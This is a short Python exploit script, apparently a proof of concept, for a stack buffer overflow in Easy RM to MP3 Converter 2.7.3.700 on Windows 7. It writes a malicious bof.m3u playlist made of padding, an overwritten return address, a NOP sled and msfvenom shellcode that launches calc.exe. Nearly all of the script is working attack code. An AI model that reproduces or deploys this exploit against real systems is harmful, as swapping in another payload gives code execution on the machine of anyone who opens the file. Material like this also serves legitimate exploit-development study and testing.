#!/usr/bin/python

# This exploit is for Easy RM to MP3 Converter 2.7.3.700 2006.09.29
# This is working under Windows 7 SP1 x86.
# Dustin Silveri
# van6uard

# BAD CHARACTERS = \x00\x0a


# msfvenom -p windows/exec cmd=calc.exe -b "\x00\x0a" -f c
#Payload size: 220 bytes
shellcode = (
"\xbb\xe7\xa7\x38\x5a\xda\xc2\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x31\x83\xef\xfc\x31\x5f\x0f\x03\x5f\xe8\x45\xcd\xa6\x1e\x0b"
"\x2e\x57\xde\x6c\xa6\xb2\xef\xac\xdc\xb7\x5f\x1d\x96\x9a\x53"
"\xd6\xfa\x0e\xe0\x9a\xd2\x21\x41\x10\x05\x0f\x52\x09\x75\x0e"
"\xd0\x50\xaa\xf0\xe9\x9a\xbf\xf1\x2e\xc6\x32\xa3\xe7\x8c\xe1"
"\x54\x8c\xd9\x39\xde\xde\xcc\x39\x03\x96\xef\x68\x92\xad\xa9"
"\xaa\x14\x62\xc2\xe2\x0e\x67\xef\xbd\xa5\x53\x9b\x3f\x6c\xaa"
"\x64\x93\x51\x03\x97\xed\x96\xa3\x48\x98\xee\xd0\xf5\x9b\x34"
"\xab\x21\x29\xaf\x0b\xa1\x89\x0b\xaa\x66\x4f\xdf\xa0\xc3\x1b"
"\x87\xa4\xd2\xc8\xb3\xd0\x5f\xef\x13\x51\x1b\xd4\xb7\x3a\xff"
"\x75\xe1\xe6\xae\x8a\xf1\x49\x0e\x2f\x79\x67\x5b\x42\x20\xed"
"\x9a\xd0\x5e\x43\x9c\xea\x60\xf3\xf5\xdb\xeb\x9c\x82\xe3\x39"
"\xd9\x7d\xae\x60\x4b\x16\x77\xf1\xce\x7b\x88\x2f\x0c\x82\x0b"
"\xda\xec\x71\x13\xaf\xe9\x3e\x93\x43\x83\x2f\x76\x64\x30\x4f"
"\x53\x07\xd7\xc3\x3f\xe6\x72\x64\xa5\xf6"
)



f=open("bof.m3u",("w+"))


# rtn address 1001B058   54               PUSH ESP

f.write("A" * 26080 +"\x58\xb0\x01\x10" + "FFFF" + "\x90"*16 + shellcode + "C" * (30000-26080-4-4-16-220))
f.close

